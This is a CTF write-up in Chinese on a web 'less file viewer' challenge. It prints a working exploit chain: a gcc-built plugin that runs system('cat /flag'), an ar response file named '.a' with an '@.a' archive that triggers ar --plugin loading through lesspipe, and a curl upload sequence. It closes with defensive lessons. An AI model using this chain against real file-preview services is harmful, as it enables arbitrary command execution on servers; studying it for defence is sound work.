# LESS 文件查看器在线版

## 题目简述

网页允许一次上传多个文件。后端依次将文件写到 `/dev/temp`，然后在 Ubuntu 24.04 环境中启动 Bash 并执行：

```bash
less -N -- "$FN"
```

用户看到的并不是单纯读取文件的结果。Ubuntu 默认的 shell 配置会启用 `lesspipe`，它根据文件类型调用各种外部转换器。本题可控同一目录中的多个文件及其处理顺序，因而可以把 GNU `ar` 的“响应文件 + 加载器插件”能力变成命令执行。决定性障碍是本地转换器链上的代码执行，网页只是上传载体。

## 解题过程

在与题目一致的 Linux 环境中准备三个文件。先构建一个在装载时执行命令的 binutils 插件：

```bash
printf '#include <stdlib.h>\nvoid onload(void *v) { system("cat /flag"); }\n' \
  | gcc -fPIC -shared -o plugin.so -xc -
```

再制作一个合法归档文件 `@.a`，以及名为 `.a` 的 `ar` 响应文件：

```bash
ar rc './@.a' /dev/null
printf '%s\n' '-s --plugin ./plugin.so ./@.a' > .a
```

三个文件在上传后位于同一个 `/dev/temp` 目录。上传顺序必须是：

```text
plugin.so
.a
@.a
```

关键是让 `@.a` 最后触发 lesspipe 对 ar 归档的处理。这条处理链会调用类似 `ar t @.a` 的命令。在 GNU 命令行约定中，`@.a` 会被解释为“从 `.a` 读取更多参数”，于是 `.a` 中的：

```text
-s --plugin ./plugin.so ./@.a
```

会使 `ar` 加载 `plugin.so`。共享库的 `onload` 回调随即在题目进程权限下执行 `cat /flag`，输出被页面收集并显示。

上传顺序是利用的一部分，不能依赖浏览器自行重排。如需稳定控制，可用 curl 按 `-F` 出现顺序构造 multipart 请求：

```bash
curl -sS 'http://TARGET/' \
  -F 'files=@plugin.so;filename=plugin.so' \
  -F 'files=@.a;filename=.a' \
  -F 'files=@./@.a;filename=@.a'
```

`@./@.a` 中第一个 `@` 是 curl 的“读取本地文件”语法，`./@.a` 才是本地路径；`filename=@.a` 明确要求远端保存为 `@.a`。还应从服务响应确认最后一个被 less 处理的文件确为 `@.a`。

可先将插件命令改为 `id` 或 `printf PWNED`验证装载链，确认输出出现后再使用 `cat /flag`。

## 方法总结

- 核心技巧：利用 lesspipe 对不可信归档的自动预处理，将 GNU `@response-file` 解析和 `ar --plugin` 组合为共享库加载。
- 识别信号：应用声称“只查看文件”，但实际调用会按类型派发的 lesspipe，同时允许攻击者控制多个同目录文件和文件名。
- 复用要点：预览器的安全性取决于整条转换链，不能只审计 `less` 本身；应在沙箱中处理不信任文件，禁用非必要预处理器，并避免将用户文件名直接交给具有二次参数解析能力的工具。
